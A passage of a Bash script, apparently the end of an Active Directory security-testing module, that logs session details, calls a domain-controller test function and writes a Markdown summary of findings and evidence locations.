    log_inf "Auth     : $( [[ "$_HAS_CREDS" -eq 1 ]] && echo "authenticated (${AD_USERNAME})" || echo "null session / unauthenticated" )"
    log_inf "Session  : ${SESSION_TS}"
    log_inf "Log      : ${LOG_FILE}"

    _validate_config || exit 1
    setup_profile "$SCAN_PROFILE"
    _confirm

    command -v trail_phase_start &>/dev/null && trail_phase_start "11_ad_testing"

    local row
    row=$(test_dc)
    local total_findings
    total_findings=$(echo "$row" | grep -oE 'findings=[0-9]+' | grep -oE '[0-9]+' || echo 0)

    command -v trail_phase_end &>/dev/null && trail_phase_end "11_ad_testing"

    # Summary report
    local report_f="${SCRIPT_DIR}/working/${PROJ_SLUG}_11_ad_summary_${SESSION_TS}.md"
    {
        printf "# Active Directory Testing Summary — %s\n\n" "$PROJECT_NAME"
        printf "| DC | Domain | Findings |\n|----|--------|----------|\n"
        local dc_col dom_col finds_col
        dc_col=$(echo "$row" | cut -d'|' -f2)
        dom_col=$(echo "$row" | cut -d'|' -f3)
        finds_col=$(echo "$row" | grep -oE 'findings=[0-9]+')
        printf "| %s | %s | %s |\n" "$dc_col" "$dom_col" "$finds_col"
        printf "\n**Total Findings:** %d\n" "$total_findings"
        printf "\nFindings JSONL: \`%s\`\n" "$FINDINGS_FILE"
        printf "\nEvidence dir  : \`%s\`\n" "$EVIDENCE_BASE"
    } > "$report_f"

    printf "\n${_G}[DONE]${_N} Active Directory testing complete.\n"
    printf "  DC       : %s (%s)\n" "${AD_DC_IP}" "${AD_DOMAIN}"
    printf "  Findings : %d\n" "$total_findings"
    printf "  Summary  : %s\n" "$report_f"
    printf "  Evidence : %s\n\n" "$EVIDENCE_BASE"
}

main "$@"
